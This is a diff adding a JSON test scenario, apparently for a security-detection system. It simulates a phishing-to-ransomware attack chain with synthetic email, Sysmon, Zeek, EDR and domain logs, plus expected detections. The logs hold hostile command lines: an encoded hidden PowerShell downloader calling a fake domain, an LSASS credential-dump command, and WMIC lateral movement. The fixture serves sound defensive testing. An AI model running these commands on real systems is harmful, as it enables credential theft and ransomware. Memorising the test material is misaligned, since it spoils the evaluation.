@@ -1,0 +1,385 @@
+{
+  "scenario_id": "phishing_ransomware_chain",
+  "name": "Phishing to Ransomware Attack Chain",
+  "description": "A finance analyst (Elena Martinez, WKSTN-1147) receives a spoofed invoice email with a macro-enabled Word document from secure-office365-update.com. Opening the attachment spawns an obfuscated PowerShell stager that downloads a second-stage payload, dumps LSASS to harvest a domain-admin credential, moves laterally via PsExec/WMI to the file and SQL servers, and finally deploys ransomware that encrypts finance shares with the .aegislock extension and drops a ransom note. Represents the full kill chain: initial access -> execution -> credential access -> lateral movement -> impact.",
+  "expected_severity": "critical",
+  "expected_techniques": [
+    "T1566.001",
+    "T1204.002",
+    "T1059.001",
+    "T1027",
+    "T1105",
+    "T1003.001",
+    "T1078",
+    "T1021.002",
+    "T1021.006",
+    "T1570",
+    "T1486",
+    "T1490"
+  ],
+  "expected_min_risk": 0.85,
+  "is_attack": true,
+  "primary_entities": {
+    "users": [
+      "emartinez",
+      "jtorres"
+    ],
+    "hosts": [
+      "WKSTN-1147",
+      "SRV-FILE01",
+      "SRV-SQL01",
+      "SRV-DC01"
+    ],
+    "malicious_domains": [
+      "secure-office365-update.com",
+      "cdn-office-update-cache.net"
+    ],
+    "malicious_ips": [
+      "185.220.101.47",
+      "185.220.101.53"
+    ],
+    "hashes": [
+      "b6b6b6a5e2d1f4a3c9e8d7b6a5c4e3f2d1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6",
+      "f1e2d3c4b5a69788091a2b3c4d5e6f7081920a1b2c3d4e5f60718293a4b5c6d0",
+      "0a1b2c3d4e5f60718293a4b5c6d7e8f901a2b3c4d5e6f708192a3b4c5d6e7f80",
+      "9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4938271605f4e3d2c1b0a9887766554433"
+    ]
+  },
+  "events": [
+    {
+      "source": "email",
+      "timestamp": "2026-07-18T13:58:00.000Z",
+      "raw": {
+        "message_id": "<8f2a1c40-e001-4b3a-9c11-ab120e1a9911@mail-relay.secure-office365-update.com>",
+        "from": "billing-support@secure-office365-update.com",
+        "to": "elena.martinez@aegiscorp.com",
+        "subject": "Invoice #Q3-88213 overdue - action required",
+        "attachments": [
+          {
+            "filename": "Invoice_Q3_88213.docm",
+            "sha256": "b6b6b6a5e2d1f4a3c9e8d7b6a5c4e3f2d1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6",
+            "content_type": "application/vnd.ms-word.document.macroEnabled.12"
+          }
+        ],
+        "urls": [
+          "https://secure-office365-update.com/invoices/Q3-88213"
+        ],
+        "spf": "fail",
+        "dkim": "fail",
+        "dmarc": "fail",
+        "spam_score": 7.8,
+        "verdict": "phishing_suspected",
+        "host": "WKSTN-1147",
+        "user": "emartinez"
+      }
+    },
+    {
+      "source": "zeek",
+      "timestamp": "2026-07-18T14:02:10.000Z",
+      "raw": {
+        "log_type": "dns",
+        "uid": "Cph0000000000001",
+        "id.orig_h": "10.20.10.57",
+        "id.resp_h": "10.20.1.10",
+        "query": "secure-office365-update.com",
+        "qtype_name": "A",
+        "rcode_name": "NOERROR",
+        "answers": [
+          "185.220.101.47"
+        ],
+        "TTLs": [
+          60.0
+        ],
+        "host": "WKSTN-1147",
+        "user": "emartinez"
+      }
+    },
+    {
+      "source": "sysmon",
+      "timestamp": "2026-07-18T14:02:22.000Z",
+      "raw": {
+        "EventID": 1,
+        "Computer": "WKSTN-1147.aegiscorp.local",
+        "User": "AEGISCORP\\emartinez",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "CommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\emartinez\\Downloads\\Invoice_Q3_88213.docm\"",
+        "ParentImage": "C:\\Windows\\explorer.exe",
+        "ParentCommandLine": "C:\\Windows\\explorer.exe",
+        "ProcessId": 6120,
+        "ParentProcessId": 4110,
+        "Hashes": "SHA256=b6b6b6a5e2d1f4a3c9e8d7b6a5c4e3f2d1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6",
+        "host": "WKSTN-1147",
+        "user": "emartinez"
+      }
+    },
+    {
+      "source": "sysmon",
+      "timestamp": "2026-07-18T14:02:41.000Z",
+      "raw": {
+        "EventID": 1,
+        "Computer": "WKSTN-1147.aegiscorp.local",
+        "User": "AEGISCORP\\emartinez",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwBjAGQAbgAtAG8AZgBmAGkAYwBlAC0AdQBwAGQAYQB0AGUALQBjAGEAYwBoAGUALgBuAGUAdAAvAHMAdAAvADEALgBwAHMAMQAnACwAJwBDADoAXAB1AHMAZQByAHMAXAB1cAB1AGIAbABpAGMAXAAxAC4AcABzADEAJwApAA==",
+        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "ParentCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\emartinez\\Downloads\\Invoice_Q3_88213.docm\"",
+        "ProcessId": 6244,
+        "ParentProcessId": 6120,
+        "IntegrityLevel": "Medium",
+        "Hashes": "SHA256=f1e2d3c4b5a69788091a2b3c4d5e6f7081920a1b2c3d4e5f60718293a4b5c6d0",
+        "host": "WKSTN-1147",
+        "user": "emartinez"
+      }
+    },
+    {
+      "source": "zeek",
+      "timestamp": "2026-07-18T14:02:48.000Z",
+      "raw": {
+        "log_type": "http",
+        "uid": "Cph0000000000002",
+        "id.orig_h": "10.20.10.57",
+        "id.resp_h": "185.220.101.53",
+        "method": "GET",
+        "host": "cdn-office-update-cache.net",
+        "uri": "/st/1.ps1",
+        "user_agent": "Mozilla/5.0",
+        "status_code": 200,
+        "resp_mime_types": "text/plain",
+        "host_asset": "WKSTN-1147",
+        "user": "emartinez"
+      }
+    },
+    {
+      "source": "suricata",
+      "timestamp": "2026-07-18T14:02:49.000Z",
+      "raw": {
+        "flow_id": 445566778899,
+        "src_ip": "10.20.10.57",
+        "src_port": 51122,
+        "dest_ip": "185.220.101.53",
+        "dest_port": 443,
+        "proto": "TCP",
+        "app_proto": "http",
+        "alert": {
+          "action": "allowed",
+          "signature": "ET MALWARE PowerShell Downloader Behavior Observed",
+          "signature_id": 2034112,
+          "category": "A Network Trojan was Detected",
+          "severity": 1
+        },
+        "host": "WKSTN-1147"
+      }
+    },
+    {
+      "source": "edr",
+      "timestamp": "2026-07-18T14:04:02.000Z",
+      "raw": {
+        "agent_id": "edr-a1b2c3d4e5f6",
+        "host": "WKSTN-1147",
+        "user": "AEGISCORP\\emartinez",
+        "process_name": "rundll32.exe",
+        "pid": 7331,
+        "ppid": 6244,
+        "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 812 C:\\Users\\Public\\lsass_1.dmp full",
+        "parent_process": "powershell.exe",
+        "sha256": "9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4938271605f4e3d2c1b0a9887766554433",
+        "signed": true,
+        "signer": "Microsoft Windows",
+        "reputation": "suspicious_behavior",
+        "mitre_techniques": [
+          "T1003.001"
+        ],
+        "network_connections": []
+      }
+    },
+    {
+      "source": "ad_auth",
+      "timestamp": "2026-07-18T14:07:15.000Z",
+      "raw": {
+        "EventID": 4672,
+        "Computer": "SRV-DC01.aegiscorp.local",
+        "TargetUserName": "jtorres",
+        "TargetDomainName": "AEGISCORP",
+        "WorkstationName": "WKSTN-1147",
+        "IpAddress": "10.20.10.57",
+        "LogonType": 3,
+        "PrivilegeList": "SeDebugPrivilege SeBackupPrivilege SeRestorePrivilege"
+      }
+    },
+    {
+      "source": "ad_auth",
+      "timestamp": "2026-07-18T14:07:20.000Z",
+      "raw": {
+        "EventID": 4624,
+        "Computer": "SRV-FILE01.aegiscorp.local",
+        "TargetUserName": "jtorres",
+        "TargetDomainName": "AEGISCORP",
+        "WorkstationName": "WKSTN-1147",
+        "IpAddress": "10.20.10.57",
+        "LogonType": 3,
+        "note": "credential reuse of harvested domain-admin ticket following LSASS dump"
+      }
+    },
+    {
+      "source": "sysmon",
+      "timestamp": "2026-07-18T14:07:33.000Z",
+      "raw": {
+        "EventID": 1,
+        "Computer": "SRV-FILE01.aegiscorp.local",
+        "User": "AEGISCORP\\jtorres",
+        "Image": "C:\\Windows\\System32\\services.exe",
+        "CommandLine": "C:\\Windows\\PSEXESVC.exe",
+        "ParentImage": "C:\\Windows\\System32\\services.exe",
+        "ParentCommandLine": "-",
+        "ProcessId": 2210,
+        "ParentProcessId": 604,
+        "host": "SRV-FILE01",
+        "user": "jtorres",
+        "src_host": "WKSTN-1147",
+        "note": "PsExec service installation - lateral movement"
+      }
+    },
+    {
+      "source": "zeek",
+      "timestamp": "2026-07-18T14:07:31.000Z",
+      "raw": {
+        "log_type": "conn",
+        "uid": "Cph0000000000003",
+        "id.orig_h": "10.20.10.57",
+        "id.resp_h": "10.20.1.20",
+        "id.orig_p": 51190,
+        "id.resp_p": 445,
+        "proto": "tcp",
+        "service": "smb",
+        "duration": 3.4,
+        "orig_bytes": 118032,
+        "resp_bytes": 4432,
+        "conn_state": "SF",
+        "history": "ShADadFf"
+      }
+    },
+    {
+      "source": "sysmon",
+      "timestamp": "2026-07-18T14:09:02.000Z",
+      "raw": {
+        "EventID": 1,
+        "Computer": "SRV-SQL01.aegiscorp.local",
+        "User": "AEGISCORP\\jtorres",
+        "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+        "CommandLine": "wmic /node:SRV-SQL01 process call create \"cmd.exe /c powershell -enc JABzAD0A...\"",
+        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "ParentCommandLine": "powershell.exe -NoProfile -WindowStyle Hidden",
+        "ProcessId": 5510,
+        "ParentProcessId": 2210,
+        "host": "SRV-FILE01",
+        "user": "jtorres",
+        "target_host": "SRV-SQL01",
+        "note": "WMI-based lateral movement to database tier"
+      }
+    },
+    {
+      "source": "ad_auth",
+      "timestamp": "2026-07-18T14:09:05.000Z",
+      "raw": {
+        "EventID": 4769,
+        "Computer": "SRV-DC01.aegiscorp.local",
+        "TargetUserName": "jtorres",
+        "TargetDomainName": "AEGISCORP",
+        "WorkstationName": "SRV-SQL01",
+        "IpAddress": "10.20.1.21",
+        "LogonType": 3,
+        "ServiceName": "cifs/SRV-SQL01",
+        "TicketEncryptionType": "0x12"
+      }
+    },
+    {
+      "source": "sysmon",
+      "timestamp": "2026-07-18T14:23:10.000Z",
+      "raw": {
+        "EventID": 11,
+        "Computer": "SRV-FILE01.aegiscorp.local",
+        "User": "AEGISCORP\\jtorres",
+        "Image": "C:\\Windows\\Temp\\svchost32.exe",
+        "ProcessId": 8811,
+        "TargetFilename": "C:\\Shares\\Finance\\Q3_Report.xlsx.aegislock",
+        "Hashes": "SHA256=0a1b2c3d4e5f60718293a4b5c6d7e8f901a2b3c4d5e6f708192a3b4c5d6e7f80",
+        "note": "ransomware binary renaming/encrypting files with .aegislock extension"
+      }
+    },
+    {
+      "source": "sysmon",
+      "timestamp": "2026-07-18T14:25:10.000Z",
+      "raw": {
+        "EventID": 11,
+        "Computer": "SRV-SQL01.aegiscorp.local",
+        "User": "AEGISCORP\\jtorres",
+        "Image": "C:\\Windows\\Temp\\svchost32.exe",
+        "ProcessId": 8812,
+        "TargetFilename": "C:\\Shares\\Finance\\Q3_Report.xlsx.aegislock",
+        "Hashes": "SHA256=0a1b2c3d4e5f60718293a4b5c6d7e8f901a2b3c4d5e6f708192a3b4c5d6e7f80",
+        "note": "ransomware binary renaming/encrypting files with .aegislock extension"
+      }
+    },
+    {
+      "source": "edr",
+      "timestamp": "2026-07-18T14:22:50.000Z",
+      "raw": {
+        "agent_id": "edr-99887766aabb",
+        "host": "SRV-FILE01",
+        "user": "AEGISCORP\\jtorres",
+        "process_name": "svchost32.exe",
+        "pid": 8811,
+        "ppid": 5510,
+        "command_line": "C:\\Windows\\Temp\\svchost32.exe --encrypt --path=C:\\Shares\\Finance --ext=.aegislock",
+        "parent_process": "wmic.exe",
+        "sha256": "0a1b2c3d4e5f60718293a4b5c6d7e8f901a2b3c4d5e6f708192a3b4c5d6e7f80",
+        "signed": false,
+        "signer": null,
+        "reputation": "malicious",
+        "mitre_techniques": [
+          "T1486",
+          "T1490"
+        ],
+        "network_connections": [
+          {
+            "dst_ip": "185.220.101.47",
+            "dst_port": 443
+          }
+        ]
+      }
+    },
+    {
+      "source": "sysmon",
+      "timestamp": "2026-07-18T14:28:05.000Z",
+      "raw": {
+        "EventID": 11,
+        "Computer": "SRV-FILE01.aegiscorp.local",
+        "User": "AEGISCORP\\jtorres",
+        "Image": "C:\\Windows\\Temp\\svchost32.exe",
+        "ProcessId": 8811,
+        "TargetFilename": "C:\\Shares\\Finance\\README_RECOVER_FILES.txt",
+        "note": "ransom note dropped"
+      }
+    },
+    {
+      "source": "suricata",
+      "timestamp": "2026-07-18T14:29:00.000Z",
+      "raw": {
+        "flow_id": 998877665544,
+        "src_ip": "10.20.1.20",
+        "src_port": 55221,
+        "dest_ip": "185.220.101.47",
+        "dest_port": 443,
+        "proto": "TCP",
+        "app_proto": "tls",
+        "alert": {
+          "action": "allowed",
+          "signature": "ET MALWARE Ransomware C2 Beacon Checkin",
+          "signature_id": 2041987,
+          "category": "A Network Trojan was Detected",
+          "severity": 1
+        }
+      }
+    }
+  ]
+}
